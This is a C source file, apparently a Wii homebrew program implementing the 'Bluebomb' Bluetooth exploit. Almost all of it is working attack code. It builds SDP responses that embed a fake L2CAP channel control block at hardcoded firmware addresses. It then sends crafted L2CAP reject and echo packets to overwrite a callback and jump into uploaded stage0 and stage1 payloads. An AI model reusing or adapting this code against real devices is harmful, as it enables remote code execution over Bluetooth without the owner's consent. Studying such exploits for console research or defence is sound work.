#include <stdio.h>
#include <stdlib.h>
#include <gccore.h>
#include <string.h>
#include "lwbt/bte.h"
#include "lwbt/btarch.h"
#include "stream_macros.h"
#include "stage0/stage0_bin.h"
#include "stage1_bin.h"
#include "lwbt/l2cap.h"
#include "lwbt/btpbuf.h"
#include <unistd.h>

static void *xfb = NULL;
static bool isSearching = false;
static GXRModeObj *rmode = NULL;

static void SyncButton(u32 held)
{
	//if((__wpads_inited == WPAD_STATE_ENABLED) && __wpad_hostsynccb) {
	//	__wpad_hostsynccb(held);
	//}
}

static s32 __bluebomb_disconnected(void *arg,struct bte_pcb *pcb,u8 err)
{
	fprintf(stderr, "__bluebomb_disconnected[%02x]",err);

	bte_free(pcb);
	return ERR_OK;
}

struct bte_pcb *btsock = NULL;

void jump_payload(int fd, int device_handle) {
	struct pbuf *data;
	int ret = l2cap_signal(NULL, L2CAP_ECHO_RSP, 1, &(btsock->sdp_pcb->remote_bdaddr), NULL);
}

#define PAYLOAD_MTU 339
uint32_t payload_remaining = 0;

void upload_payload(int fd, int device_handle, void* payload, uint32_t size) {
	int segments = size / PAYLOAD_MTU;
	int ret = 0;
	struct pbuf *data;
	
	fprintf(stderr, "0 / %d", size);
	fflush(stderr);

	if (payload_remaining == 0){
		if((data = btpbuf_alloc(PBUF_RAW, PAYLOAD_MTU, PBUF_RAM)) != NULL) {
			memcpy(data->payload, payload, PAYLOAD_MTU);

			fprintf(stderr, "\r%d / %d", PAYLOAD_MTU, size);
			fflush(stderr);
			ret = l2cap_signal(NULL, L2CAP_ECHO_RSP, 0, &(btsock->sdp_pcb->remote_bdaddr), data);
		}

		payload_remaining = size - PAYLOAD_MTU;
	} else if (payload_remaining >= PAYLOAD_MTU) {
		if((data = btpbuf_alloc(PBUF_RAW, PAYLOAD_MTU, PBUF_RAM)) != NULL) {
			memcpy(data->payload, payload + size - payload_remaining, PAYLOAD_MTU);

			fprintf(stderr, "\r%d / %d", size - payload_remaining, size);
			fflush(stderr);
			ret = l2cap_signal(NULL, L2CAP_ECHO_RSP, 0, &(btsock->sdp_pcb->remote_bdaddr), data);
		}

		payload_remaining -= PAYLOAD_MTU;
	} else {
		if((data = btpbuf_alloc(PBUF_RAW, payload_remaining, PBUF_RAM)) != NULL) {
			memcpy(data->payload, payload + size - payload_remaining, payload_remaining);

			fprintf(stderr, "\r%d / %d", size, size);
			fflush(stderr);
			ret = l2cap_signal(NULL, L2CAP_ECHO_RSP, 0, &(btsock->sdp_pcb->remote_bdaddr), data);
		}

		payload_remaining = 0;
		fprintf(stderr, "\nJumping to payload!\n");
		jump_payload(0, 0);
	}
}

err_t bluebomb_success(void)
{
	//fprintf(stderr, "Got response!\n");
	
	//fprintf(stderr, "Uploading payload...\n");
	upload_payload(0, 0, stage1_bin, stage1_bin_length);
	//fprintf(stderr, "Jumping to payload!\n");
	//jump_payload(raw_sock, device_handle);
	
	return ERR_OK;
}

static s32 __bluebomb_accept_step2(void *arg,struct bte_pcb *pcb,u8 err)
{
	fprintf(stderr, "__bluebomb_accept_step2(%d)", err);

	l2ca_bluebomb(pcb->sdp_pcb, bluebomb_success);

	if (err!=ERR_OK) {
		bte_disconnect(pcb);
		return ERR_OK;
	}

	return err;
}

uint32_t L2CB = 0;
struct l2cap_payload {
	uint8_t opcode;
	uint8_t id;
	uint16_t length;
	uint8_t data[];
} __attribute__ ((packed));
#define L2CAP_PAYLOAD_LENGTH 4

struct l2cap_packet {
	uint16_t length;
	uint16_t cid;
	struct l2cap_payload payload;
} __attribute__ ((packed));
#define L2CAP_HEADER_LENGTH 4 // L2CAP_HDR_LEN
#define L2CAP_OVERHEAD 8

extern void hci_get_bd_addr(struct bd_addr *bdaddr);

void do_hax(int raw_sock, int device_handle) {
	err_t ret;
	struct pbuf *data;
	// Chain these packets together so things are more deterministic.
	int bad_packet_len = L2CAP_PAYLOAD_LENGTH + 6;
	int empty_packet_len = L2CAP_PAYLOAD_LENGTH;
	int total_length = L2CAP_HEADER_LENGTH + bad_packet_len + empty_packet_len;
	struct pbuf *hax = btpbuf_alloc(PBUF_RAW,total_length,PBUF_RAM);
	//struct l2cap_packet *hax = malloc(total_length);
	struct l2cap_payload *p = (struct l2cap_payload *)hax->payload;
	
	//hax->length = htole16(bad_packet_len + empty_packet_len);
	//hax->cid = htole16(0x0001);
	
	fprintf(stderr, "Overwriting callback in switch case 0x9.\n");
	
	/*p->opcode = 0x01; // L2CAP_CMD_REJECT
	p->id = 0x00;
	p->length = htole16(0x0006);
	uint8_t *d = &p->data[0];
	
	UINT16_TO_STREAM(d, L2CAP_INVALID_CID); // L2CAP_CMD_REJ_INVALID_CID
	UINT16_TO_STREAM(d, 0x0000); // rcid (from faked ccb)
	UINT16_TO_STREAM(d, 0x0040 + 0x1f); // lcid
	
	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));*/

	if((data = btpbuf_alloc(PBUF_RAW, L2CAP_CMD_REJ_SIZE+4, PBUF_RAM)) != NULL) {
		((u16_t *)data->payload)[0] = htole16(L2CAP_INVALID_CID);
		((u16_t *)data->payload)[1] = htole16(0x0000); // rcid (from faked ccb)
		((u16_t *)data->payload)[2] = htole16(0x0040 + 0x1f); // lcid

		ret = l2cap_signal(NULL, L2CAP_CMD_REJ, 0, &(btsock->sdp_pcb->remote_bdaddr), data);
	}
	
	fprintf(stderr, "Trigger switch statement 0x9.\n");
	
	/*p->opcode = 0x09; // L2CAP_CMD_ECHO_RSP which will trigger a callback to our payload
	p->id = 0x00;
	p->length = htole16(0x0000);
	
	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
	
	fprintf(stderr, "Sending hax\n");
	lp_acl_write(&btsock->sdp_pcb->remote_bdaddr, hax, total_length);*/
	ret = l2cap_signal(btsock->sdp_pcb, L2CAP_ECHO_RSP, 0, &(btsock->sdp_pcb->remote_bdaddr), NULL);
	//btpbuf_free(hax);
	
	fprintf(stderr, "Awaiting response from stage0\n");
	//int ret = await_response(raw_sock, 0x5330); // 'S0'
	//if (ret < 0) {
	//	fprintf(stderr, "Didn't find response from stage0\n");
	//	return;
	//}
	//fprintf(stderr, "Got response!\n");
}

struct ccb {
	uint8_t in_use;
	uint32_t chnl_state;
	uint32_t p_next_ccb;
	uint32_t p_prev_ccb;
	uint32_t p_lcb;
	uint16_t local_cid;
	uint16_t remote_cid;
	// We only go up to the fields we care about, you should still leave the rest blank as there are some fields that should be just left zero after it like the timer object.
};

// TODO: Figure out the real MTU instead of choosing semi-random numbers
#define SDP_MTU 0xD0

void send_sdp_service_response(u16_t tid) {
	uint16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
	uint32_t SDP_CB = L2CB + 0xc00;
	
	uint8_t *response = malloc(required_size);
	memset(response, 0x00, required_size);
	uint8_t *p = response;
	
	struct ccb fake_ccb;
	memset(&fake_ccb, 0x00, sizeof(struct ccb));
	fake_ccb.in_use = 1;
	fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
	fake_ccb.p_next_ccb = htobe32(SDP_CB + 0x68);
	fake_ccb.p_prev_ccb = htobe32(L2CB + 8 + 0x54 - 8);
	fake_ccb.p_lcb = htobe32(L2CB + 0x8);
	fake_ccb.local_cid = htobe16(0x0000);
	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
	
	UINT8_TO_BE_STREAM(p, SDP_SERVICE_SEARCH_RSP); // SDP_ServiceSearchResponse
	UINT16_TO_BE_STREAM(p, tid); // Transaction ID (ignored, no need to keep track of)
	UINT16_TO_BE_STREAM(p, 0x0059); // ParameterLength
	UINT16_TO_BE_STREAM(p, 0x0015); // TotalServiceRecordCount
	UINT16_TO_BE_STREAM(p, 0x0015); // CurrentServiceRecordCount
	memcpy(p + (0xa * 4), &fake_ccb, sizeof(struct ccb)); p += (0x15 * 4); // Embed payload in ServiceRecordHandleList
	UINT8_TO_BE_STREAM(p, 0x00); // ContinuationState

	bte_sendsdp(btsock, response, p - response);
	
	uint8_t *reply = malloc(0x200);
	//recv(fd, reply, 0x200, 0); // TODO: Check the reply for errors so we can catch things going wrong earlier.
	free(reply);
	free(response);
}

s32 size_remaining = 0;

void send_sdp_attribute_response(u16_t tid, void* payload, int len) {
	uint16_t required_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1;
	
	uint8_t *response = malloc(required_size);
	memset(response, 0x00, required_size);
	uint8_t *p = response;

	if (size_remaining == 0) {
		UINT8_TO_BE_STREAM(p, SDP_SERVICE_ATTR_RSP); // SDP_ServiceAttributeResponse
		UINT16_TO_BE_STREAM(p, tid); // Transaction ID (ignored, no need to keep track of)
		UINT16_TO_BE_STREAM(p, 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1); // ParameterLength
		UINT16_TO_BE_STREAM(p, 1 + 1 + 1 + 2 + 1 + SDP_MTU); // AttributeListByteCount
		UINT8_TO_BE_STREAM(p, 0x35); // DATA_ELE_SEQ_DESC_TYPE and SIZE_1
		UINT8_TO_BE_STREAM(p, 0x02); // size of data elements
		UINT8_TO_BE_STREAM(p, 0x09); // UINT_DESC_TYPE and SIZE_2
		UINT16_TO_BE_STREAM(p, 0xbeef); // The dummy int
		UINT8_TO_BE_STREAM(p, 0x00); // padding so instruction is 0x4 aligned
		memcpy(p, payload, len > SDP_MTU ? SDP_MTU : len); p += (len > SDP_MTU ? SDP_MTU : len); // payload
		UINT8_TO_BE_STREAM(p, len <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
		
		bte_sendsdp(btsock, response, p - response);

		size_remaining = len - SDP_MTU;
	} else if (size_remaining > 0) {
		// We don't have to care about giving a valid attribute sequence this time so just stick the payload right in.
		UINT8_TO_BE_STREAM(p, 0x05); // SDP_ServiceAttributeResponse
		UINT16_TO_BE_STREAM(p, 0x0001); // Transaction ID (ignored, no need to keep track of)
		UINT16_TO_BE_STREAM(p, 2 + SDP_MTU + 1); // ParameterLength
		UINT16_TO_BE_STREAM(p, SDP_MTU); // AttributeListByteCount
		memcpy(p, payload + len - size_remaining, size_remaining > SDP_MTU ? SDP_MTU : size_remaining); p += (size_remaining > SDP_MTU ? SDP_MTU : size_remaining); // payload
		UINT8_TO_BE_STREAM(p, size_remaining <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
		
		bte_sendsdp(btsock, response, p - response);
		
		size_remaining -= SDP_MTU;

		if (size_remaining <= 0) {
			do_hax(0, 0);
		}
	}

	free(response);
	return;
}

static s32 __bluebomb_receive(void *arg,void *buffer,u16 len)
{
	fprintf(stderr, "__bluebomb_receive[%02x]\n",*(char*)buffer);
	u8_t hdr = *(u8_t *)buffer;
	buffer++;
	u16_t tid = be16toh(*((u16_t*)(buffer)));
	buffer += 2;
	fprintf(stderr, "SDP PDU %d, tid %d\n", hdr, tid);

	switch (hdr) {
		case SDP_SERVICE_SEARCH_REQ:
			send_sdp_service_response(tid);
			break;
		case SDP_SERVICE_ATTR_REQ:
			send_sdp_attribute_response(tid, stage0_bin, stage0_bin_len);
			//fprintf(stderr, "Sleeping for 5 seconds to try to make sure stage0 is flushed\n");
			//sleep(5000);
			
			//fprintf(stderr, "Doing hax\n");
			//do_hax(0, 0);
			break;
	}

	return ERR_OK;
}

int bluebomb_accept(s32 result, void *userdata)
{
	s32 err;

	btsock = bte_new();
	if (btsock==NULL)
	{
		fprintf(stderr, "bluebomb_accept: bte_new failed to alloc new sock");
		return 0;
	}

	struct bd_addr addr;
	hci_get_bd_addr(&addr);
	fprintf(stderr, "Time to fuck the Wii\nWe are %02x:%02x:%02x:%02x:%02x:%02x\n", addr.addr[5], addr.addr[4], addr.addr[3], addr.addr[2], addr.addr[1], addr.addr[0]);

	bte_received(btsock,__bluebomb_receive);
	bte_disconnected(btsock,__bluebomb_disconnected);
	
	err = bte_listenasync(btsock,BD_ADDR_ANY,__bluebomb_accept_step2);
	if(err==ERR_OK) return 1;
	
	fprintf(stderr, "bluebomb_accept: bte_listenasync failed(%d)", err);

	bte_free(btsock);
	btsock = NULL;
	return 0;
}

bool poweroff = false;

void WiiPowerPressed()
{
    //poweroff = true;
}

//---------------------------------------------------------------------------------
int main(int argc, char **argv) {
//---------------------------------------------------------------------------------

	// Initialise the video system
	VIDEO_Init();

	// Obtain the preferred video mode from the system
	// This will correspond to the settings in the Wii menu
	rmode = VIDEO_GetPreferredMode(NULL);

	// Allocate memory for the display in the uncached region
	xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));

	// Initialise the console, required for printf
	CON_Init(xfb, 20, 20, rmode->fbWidth-20, rmode->xfbHeight-20, rmode->fbWidth*VI_DISPLAY_PIX_SZ);
	//SYS_STDIO_Report(true);

	// Set up the video registers with the chosen mode
	VIDEO_Configure(rmode);

	// Tell the video hardware where our display memory is
	VIDEO_SetNextFramebuffer(xfb);

	// Clear the framebuffer
	VIDEO_ClearFrameBuffer(rmode, xfb, COLOR_BLACK);

	// Make the display visible
	VIDEO_SetBlack(false);

	// Flush the video register changes to the hardware
	VIDEO_Flush();

	// Wait for Video setup to complete
	VIDEO_WaitVSync();
	if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();

	SYS_SetPowerCallback(WiiPowerPressed);

	// This function initialises the attached controllers
	//WPAD_Init();

	//tell wpad to output the IR data
	//WPAD_SetDataFormat(WPAD_CHAN_ALL, WPAD_FMT_BTNS_ACC_IR);

	//set console starting position to the second row, to make space for tv's offsets
	fprintf(stderr, "\x1b[2;0H");

	fprintf(stderr, "Hello World!\n");
	fprintf(stderr, "Connect a wiimote by pressing a button\n");
	fprintf(stderr, "Or press the red sync button on the wii together with the wiimote!\n");
	fprintf(stderr, "to toggle searching for guest wiimotes, press +\n");
	fprintf(stderr, "to exit, press the home\n");
	
	bool test = TRUE;
	uint32_t payload_addr = 0x81780000; // 512K before the end of mem 1

	while(1) 
	{
		//reset console location to 8th row
		//fprintf(stderr, "\x1b[8;0H");

		// Call WPAD_ScanPads each loop, this reads the latest controller states
		//WPAD_ScanPads();
		
		/*for (int i = 0; i <= 3; i++)
		{
			//clear line and print the wiimote's data
			fprintf(stderr, "\33[2K\r");
			WPADData* data = WPAD_Data(i);
			if(data->data_present)
				fprintf(stderr, "wiimote %d: x -> %f y-> %f angle -> %f\n", i, data->ir.x, data->ir.y, data->ir.angle);
			else
				fprintf(stderr, "wiimote %d: Disconnected\n", i);
		}*/

		// WPAD_ButtonsDown tells us which buttons were pressed in this loop
		// this is a "one shot" state which will not fire again until the button has been released
		//u32 pressed = WPAD_ButtonsDown(0) | WPAD_ButtonsDown(1) | WPAD_ButtonsDown(2) | WPAD_ButtonsDown(3);

		// We return to the launcher application via exit
		//if ( pressed & WPAD_BUTTON_HOME ) break;

		//if ( pressed & WPAD_BUTTON_PLUS )
		if (test)
		{
			test = FALSE;
			//WPAD_Shutdown();
			fprintf(stderr, "Bluetooth shut down, starting Bluebomb\n");
			L2CB = 0x811725E0; // 4.3u
			
			if (L2CB >= 0x81000000) {
				fprintf(stderr, "Detected system menu\n");
				payload_addr = 0x80004000;
			}
			
			fprintf(stderr, "App settings:\n");
			fprintf(stderr, "\tL2CB: 0x%08X\n", L2CB);
			fprintf(stderr, "\tpayload_addr: 0x%08X\n", payload_addr);
			
			*(uint32_t*)(stage0_bin + 0x8) = htobe32(payload_addr);
	
			BTE_Init();
			BTE_SetHostSyncButtonCallback(SyncButton);
			BTE_InitCore(bluebomb_accept);
		}

		// Wait for the next frame
		VIDEO_WaitVSync();

		if (poweroff) {
			SYS_ResetSystem(SYS_POWEROFF,0,0);
			break;
		}
	}

	// loop over all wiimotes and disconnect them
	// this would shutdown the wiimotes and they would only respond after have pressed a button again
	// under normal circumstances, this is not wanted and is why it's disabled here
	// its more user friendly if the wiimote is left in a seeking state so that the launcher can pick it back up again
#if 0
	for (int i = 0;i < WPAD_MAX_WIIMOTES ;i++)
	{
		if(WPAD_Probe(i,0) < 0)
			continue;
		WPAD_Flush(i);
		WPAD_Disconnect(i);
	}
#endif

	// Shutdown the WPAD system
	// Any wiimotes that are connected will be force disconnected
	// this results in any connected wiimotes to be left in a seeking state
	// in a seeking state the wiimotes will automatically reconnect when the subsystem is reinitialized
	//WPAD_Shutdown();

	return 0;
}
